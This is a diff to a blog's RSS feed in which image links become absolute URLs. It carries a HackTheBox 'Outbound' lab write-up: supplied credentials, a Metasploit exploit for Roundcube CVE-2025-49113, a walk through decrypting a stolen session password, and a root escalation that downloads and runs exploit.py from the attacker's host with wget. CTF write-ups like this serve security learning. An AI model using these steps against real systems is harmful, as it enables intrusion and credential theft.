@@ -17,13 +17,13 @@
       <guid>https://Maaroof-Khan10.github.io/posts/2/</guid>
       <description>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
 &lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
 &lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
 &lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;</description>
       <content>&lt;p&gt;Hello everyone, and welcome to my first-ever write-up!&lt;/p&gt;
 &lt;p&gt;This box seemed pretty straightforward at first, but it wasn&amp;rsquo;t long before it had me begging for mercy. Let&amp;rsquo;s dive in!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/htb_task_page.png&#34; alt=&#34;HackTheBox Task Page&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I booted up the &amp;ldquo;Outbound&amp;rdquo; machine, ready to see what this bad boy had to offer. We&amp;rsquo;re handed credentials right from the start (&lt;code&gt;tyler / LhKL1o9Nm3X2&lt;/code&gt;), which almost certainly means a login portal awaits.&lt;/p&gt;
 &lt;h3 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h3&gt;
 &lt;p&gt;As is tradition with any HackTheBox machine, the first step is always &lt;code&gt;nmap&lt;/code&gt;.&lt;/p&gt;
@@ -60,16 +60,16 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I added the following line:
 &lt;code&gt;10.10.11.77     outbound.htb mail.outbound.htb&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;Time to check out this mailing service.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;roundcube_login.png&#34; alt=&#34;Roundcube Login Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/roundcube_login.png&#34; alt=&#34;Roundcube Login Page&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;roundcube-exploit&#34;&gt;Roundcube Exploit&lt;/h3&gt;
 &lt;p&gt;Here it is, the moment we&amp;rsquo;ve all been waiting for: a login page! Let&amp;rsquo;s use the credentials we were given. Success! We&amp;rsquo;re in, but Tyler&amp;rsquo;s inbox is bone dry. Guess he isn&amp;rsquo;t too popular.&lt;/p&gt;
 &lt;p&gt;A quick look at the &amp;ldquo;About&amp;rdquo; section reveals the software version.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;roundcube_about.png&#34; alt=&#34;Roundcube About Page&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/roundcube_about.png&#34; alt=&#34;Roundcube About Page&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We&amp;rsquo;re dealing with &lt;strong&gt;Roundcube Webmail 1.6.10&lt;/strong&gt;. Before diving down a Google rabbit hole for exploits, my first move is always to fire up &lt;code&gt;metasploit&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo msfconsole
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;search roundcube
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And what do you know, we hit the jackpot! An exploit for our version is available. The exact CVE is &lt;code&gt;CVE‑2025‑49113&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;metasploit_exp.png&#34; alt=&#34;Metasploit Modules&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/metasploit_exp.png&#34; alt=&#34;Metasploit Modules&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Time to exploit (rubs hands).
 Used the following steps to run the exploit:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;use &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
@@ -97,7 +97,7 @@ Here is a sneak peak:&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;this-part-in-my-opinion-was-the-trickiest-of-all-in-this-box&#34;&gt;This part in my opinion was the trickiest of all in this box&lt;/h4&gt;
 &lt;p&gt;The &lt;code&gt;session&lt;/code&gt; table gives us a bunch of base64 encoded session details&lt;/p&gt;
 &lt;p&gt;Using CyberChef, we can decode this data and find something very interesting.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;cyberchef-jacob.png&#34; alt=&#34;CyberChef showing Jacob&amp;rsquo;s credentials&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/cyberchef-jacob.png&#34; alt=&#34;CyberChef showing Jacob’s credentials&#34;&gt;&lt;/p&gt;
 &lt;p&gt;We found another user, &lt;code&gt;jacob&lt;/code&gt;, and more importantly, his password! The catch? It&amp;rsquo;s encrypted. But wait, we have that DES key from the config file. After a lot of digging, I confirmed that Roundcube uses Triple DES for session data encryption.&lt;/p&gt;
 &lt;p&gt;Here&amp;rsquo;s how to decrypt the password:&lt;/p&gt;
 &lt;ol&gt;
@@ -108,7 +108,7 @@ Here is a sneak peak:&lt;/p&gt;
 &lt;li&gt;Get the password&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Here is the decrypted password we get:&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;password_decrypt.png&#34; alt=&#34;CyberChef decrypting the password&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/password_decrypt.png&#34; alt=&#34;CyberChef decrypting the password&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h3&gt;
 &lt;p&gt;Now that we have jacob in our control, let&amp;rsquo;s check this lad&amp;rsquo;s account shall we&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;su jacob
@@ -150,7 +150,7 @@ Lets use &lt;code&gt;LinPeas&lt;/code&gt; to find something (&lt;code&gt;sudo -l
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://&amp;lt;Your-HTB-IP&amp;gt;/exploit.py
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 exploit.py
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And Wham-Bam-Thank-You-Ma&amp;rsquo;am! We got root!&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;cover.png&#34; alt=&#34;HTB PWNED&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Maaroof-Khan10.github.io/posts/2/cover.png&#34; alt=&#34;HTB PWNED&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Now, just head to &lt;code&gt;/root&lt;/code&gt; and grab your well-earned flag.&lt;/p&gt;
 &lt;p&gt;Happy Hacking! And see you next week&lt;/p&gt;
 </content>
